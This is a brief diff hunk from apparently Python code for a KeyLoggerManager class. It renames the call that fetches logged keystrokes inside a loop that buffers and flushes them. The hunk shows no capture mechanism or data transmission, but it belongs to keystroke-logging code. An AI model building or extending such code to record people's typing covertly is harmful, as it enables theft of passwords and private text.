@@ -25,7 +25,7 @@ class KeyLoggerManager:
 
     def _run(self):
         while self.running:
-            events = self.KeyLoggerServise.get_events()
+            events = self.KeyLoggerServise.get_logged_keys()
             self.buffer.extend(events)
             if self.buffer:
                 self._flush_buffer()
